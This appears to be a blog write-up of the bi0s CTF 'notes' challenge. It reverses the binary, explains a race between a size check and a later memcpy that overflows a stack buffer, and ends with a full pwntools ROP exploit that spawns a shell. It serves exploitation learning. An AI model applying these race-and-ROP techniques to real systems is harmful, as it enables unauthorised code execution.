# Intro

Hey there. I got lazy with writeups again.

This weekend i played [bi0s CTF 2022/3](https://ctftime.org/event/1714) with team [1/0](https://ctftime.org/team/212987) (formerly [zh3r0](https://ctftime.org/team/116018)). I worked on the `notes` challenge for the time I was able to play. It was a fun challenge, introducing me to the `shmget` and `shmat` functions which I had never seen before and going back to basics with a good old race condition. 

## Reversing

### Protections 

    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

No canary is certainly interesting. Theres almost certainly gonna be a buffer overflow in here somewhere...

### Functions

Heres the main function:
```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  pthread_t newthread; // [rsp+0h] [rbp-30h] BYREF
  pthread_t v5; // [rsp+8h] [rbp-28h] BYREF
  void *shmem; // [rsp+18h] [rbp-18h]
  int shmid; // [rsp+24h] [rbp-Ch]
  key_t key; // [rsp+28h] [rbp-8h]
  int i; // [rsp+2Ch] [rbp-4h]

  buffering(a1, a2, a3);
  art();
  alarm(0x3Cu);
  key = getpid();
  shmid = shmget(key, 0x800uLL, 950);
  if ( shmid == -1 )
  {
    syscall(1LL, 1LL, "Error in shmget\n", 17LL);
    return 0LL;
  }
  else
  {
    shmem = shmat(shmid, 0LL, 0);
    if ( shmem != (void *)-1LL )
    {
      memset(shmem, 0, 0x800uLL);
      *((_BYTE *)shmem + 29) = 0;
      if ( pthread_create(&newthread, 0LL, wait_and_copy, shmem) )
        syscall(1LL, 1LL, "Error in creating thread 1\n", 28LL);
      if ( pthread_create(&v5, 0LL, start_heap_note, shmem) )
        syscall(1LL, 1LL, "Error in creating thread 2\n", 28LL);
      for ( i = 0; i <= 1; ++i )
        pthread_join(*(&newthread + i), 0LL);
      shmdt(shmem);
      shmctl(shmid, 0, 0LL);
      syscall(1LL, 1LL, "Done!\n", 6LL);
      exit(0);
    }
    syscall(1LL, 1LL, "Error in shmat\n", 16LL);
    return 0LL;
  }
}
```

Fairly simple, we set up buffering and the alarm stuff, then get our pid and call into `shmget`. Looking at the man page for this function we can see:

```
int shmget(key_t key, size_t size, int shmflg);
...
       shmget() returns the identifier of the System V shared memory segment associated with the value of the ar‐
       gument key.  It may be used either to obtain the identifier of a previously created shared memory  segment
       (when shmflg is zero and key does not have the value IPC_PRIVATE), or to create a new set.
```

With `key` as our pid, and the fact that we have not called any `shm` functions before, we can assume that this call will create a new "shared memory segment" rather than reference an old one. So what is a shared memory segment? We can find the answer [here](https://man7.org/linux/man-pages/man7/sysvipc.7.html):

```
   **Shared memory segments**
       System V shared memory allows processes to share a region a
       memory (a "segment").
```

Fairly obvious by the name, but this is a mechanism that allows multiple processes or threads to share some memory. 

After checking errors we drop into the else case and `shmat`. Looking at the same page we got the shared memory segment info from we can see:

```
       [shmat(2)](https://man7.org/linux/man-pages/man2/shmat.2.html)
              Attach an existing shared memory object into the calling
              process's address space.
```

So this is the function that actually does the legwork. It returns an address which will be the start of our requested shared memory.

After nulling out the memory we drop into 2 threads. After which we return.

#### wait_and_copy

```c
void __fastcall __noreturn wait_and_copy(void *shmem)
{
  while ( 1 )
  {
    *((_BYTE *)shmem + 0x1C) = 0;
    while ( *((_BYTE *)shmem + 0x1C) != 1 )
      ;
    copymem((__int64)shmem);
    *((_BYTE *)shmem + 0x1D) = 1;
  }
}
```

Pretty simple, we just wait until a variable at offset +0x1c is set to one, then call into `copymem`. Safe to assume this variable is a lock of some kind. After the call we set offset +0x1d to 1. Maybe also some kind of lock?

#### copy_mem

```c
void *__fastcall copymem(__int64 shmem)
{
  char dest[64]; // [rsp+10h] [rbp-40h] BYREF

  sleep(2u);
  if ( *(int *)(shmem + 0x18) > 64 || *(int *)(shmem + 0x18) < 0 )
  {
    syscall(1LL, 1LL, "Size Limit Exceeded\n", 20LL);
    exit(0);
  }
  xormem(shmem);
  sleep(1u);
  syscall(1LL, 1LL, "Sent!\n", 6LL);
  return memcpy(dest, (const void *)(shmem + 0x41E), *(int *)(shmem + 0x18));
```

After sleeping for 2 seconds we check offset +0x18, making sure it is less than 64 and more than 0. If not we complain about the size limit, so i'm assuming this is the "size". Next we xor the memory and sleep for another second. 

At this point is was fairly clear to me that this function is the bug - even though the stack buffer appears to be checked we have multiple threads, maybe there is some way to change the size during the second sleep? After this we copy into our stack buffer `size` bytes from our shared memory and return.

The `xormem` function isnt particularly relevant. We just xor the contents of our `shmem` with ascii characters - this may sound like a massive problem, but it isnt - you'll see soon enough.

### store_note

In our other thread we start a heap-note like process in which we can create/edit/print various fields. However as my solution only uses a single one of these I will only cover said function, the rest is fairly self explanitory after you understand this anyway.

```c
__int64 __fastcall store_note(__int64 shmem)
{
  __int64 result; // rax

  syscall(1LL, 1LL, "Enter Note ID: ", 15LL);
  read(shmem, 8LL);
  syscall(1LL, 1LL, "Enter Note Name: ", 17LL);
  read(shmem + 8, 16LL);
  syscall(1LL, 1LL, "Enter Note Size: ", 17LL);
  __isoc99_scanf("%d", shmem + 0x18);
  syscall(1LL, 1LL, "Enter Note Content: ", 20LL);
  read(shmem + 0x41E, *(unsigned int *)(shmem + 0x18));
  result = shmem;
  *(_BYTE *)(shmem + 0x1C) = 1;
  return result;
}
```

Fairly easy to understand, we read in an id (8 bytes), name (16 bytes) and content (controlled size). From this we can assume the structure of our `shmem`:

```
shmem+0x0 == note ID (0x8).
shmem+0x8 == note name (0x10).
shmem+0x18 == note size (0x4)
shmem+0x1c == thread creation lock, has to be 1 before thread 1 (copy thread) can access (0x1).
```

After we store a note, we "unlock" it by setting the creation lock to 1. Of course our other thread is spinning and checking this variable so when it switches over it can start copying memory into the stack buffer. 

Now that we have all this information, we can try exploiting it.

## Vulnerability

The bug is a fairly obvious race condition, although i hate to call it a race condition because the amount of time the program sleep()s means we hit it basically every time. 

If we look back at the `copymem` function again with what we know about the `store_note` functionality now:

```c
void *__fastcall copymem(__int64 shmem)
{
  char dest[64]; // [rsp+10h] [rbp-40h] BYREF

  sleep(2u);
  if ( *(int *)(shmem + 0x18) > 64 || *(int *)(shmem + 0x18) < 0 )
  {
    syscall(1LL, 1LL, "Size Limit Exceeded\n", 20LL);
    exit(0);
  }
  xormem(shmem);
  sleep(1u); // [1]
  syscall(1LL, 1LL, "Sent!\n", 6LL);
  return memcpy(dest, (const void *)(shmem + 0x41E), *(int *)(shmem + 0x18));
```

One question comes to mind, what if we initially requested a note with a valid size, but as the program is sleeping at `[1]` we swap it out to a note with a much bigger size? This could allow you to overflow the buffer since the `memcpy` happens immediately afterwards. Since the sleep happens after `xormem` we also dont have to care about our `shmem` being corrupted since we replace it anyway. 

This looks like this in my solution script:

```python
add("A", "B", 60, "ABCD")
sleep(2)
add("A", "B", 600, pload )
```

We create a good note, wait 2 seconds for the first sleep, then after its passed the check and inside the second sleep, swap the contents to a rop payload. Since PIE is off we also have some gadgets to use. You may have also noticed the usage of the raw `syscall` function. This means we can use `syscall` instructions with no leaks, which is a massive plus.

## Exploitation

Seeing what we have when we return into our ropchain from `copymem`, it looks pretty good. For `execve`, we need:

 - rax == 0x3b
 - \[rdi\] == "/bin/sh"
 - \[rsi\] == 0
 - \[rdx\] == 0

Thankfully, rsi and rdx already point to nulls. This means we need to find a way to control rax and rdi. 

### rax

I couldnt find any suitable gadgets in the binary for rax, so I got a bit exotic. If we look at the man page for `alarm`, we can see:

```
       **alarm**() returns the number of seconds remaining until any
       previously scheduled alarm was due to be delivered, or zero if
       there was no previously scheduled alarm.
```

We know that alarm can specify how long until `SIGALRM` is raised. So what if we did something like:

1. Call `alarm(0x3b)` to set the the countdown to `SIGALRM` to 0x3b seconds.
2. Call alarm again, this time 0x3b will be returned in rax exactly where it needs to be for our syscall.

This is the method I used for controlling rax in my ropchain:
```python
pload += p64(rdi)
pload += p64(0x3b)
pload += p64(alarm_plt)
pload += p64(rdi)
pload += p64(0x3b)
pload += p64(alarm_plt)
```

### rdi

This is more obvious - I wanna find a way to write "/bin/sh" into the bss so i can reference it in my ropchain. Thankfully I can use some of the note editing functionality i skipped over earlier to achieve this:

```c
__int64 __fastcall edit_id_show(__int64 shmem)
{
  syscall(1LL, 1LL, "Enter Note ID: ", 15LL);
  read(shmem, 8LL);
  syscall(1LL, 1LL, "Note Name: ", 11LL);
  syscall(1LL, 1LL, shmem + 8, 16LL);
  syscall(1LL, 1LL, "Note Content: ", 14LL);
  return syscall(1LL, 1LL, shmem + 1054, *(unsigned int *)(shmem + 24));
}
```

We can control rdi, so if we just pass a bss address, we can write 8 bytes into it using this `read(shmem, 8)`. Thankfully "/bin/sh\\x00" is exactly 8 bytes. 

After we can control these registers we can drop directly into a shell. Heres my full script:

```python
from pwn import *
from time import sleep

pname = "./notes"
context.log_level = "debug"

def cmd(stuff):
    p.sendafter(": ", stuff)

def add(id, name, size, buf):
    p.sendlineafter(": ", str(1))
    cmd(id)
    cmd(name)
    p.sendlineafter(": ", str(size))
    cmd(buf)

sc = '''
b *0x00401b81
b *0x00401795
c
'''

p = process(pname)
#p = remote("pwn.chall.bi0s.in", 34973)
gdb.attach(p, sc)
sleep(1)

# 211:0x0000000000401bc2: syscall;
syscall = 0x0000000000401bc2 

## edit note stuff 
edits = 0x00401795

# bss buffer for our rdi:
bss_buf = 0x00000000404050

alarm_plt = 0x401060
# 179:0x0000000000401bc0: pop rdi; ret;
rdi = 0x0000000000401bc0

pload = b"A"*64
pload += b"C"*8
pload += p64(rdi)
pload += p64(bss_buf)
pload += p64(edits)
pload += p64(rdi)
pload += p64(0x3b)
pload += p64(alarm_plt)
pload += p64(rdi)
pload += p64(0x3b)
pload += p64(alarm_plt)
pload += p64(rdi)
pload += p64(bss_buf)
pload += p64(syscall)

add("A", "B", 60, "ABCD")
sleep(2)
add("A", "B", 600, pload )

sleep(3)
## for calling edit in the rop
p.sendafter("Note ID: ", "//bin/sh")
## may also be needed, threads are being weird - i think our heap note thread is intercepting our stdin >:(.
#p.send("//bin/sh")
#p.send("//bin/sh")


p.interactive()
```

Note: I sent "//bin/sh" because for some reason the first "/" wasnt sending properly. Still dont know why - it works tho.

# Closing thoughts

This CTF was fun. I was expecting this challenge to be a lot more painful, but I guess thats just what CTF does to your brain lol. 

Thanks for reading, see you again... Soon... Maybe :P.

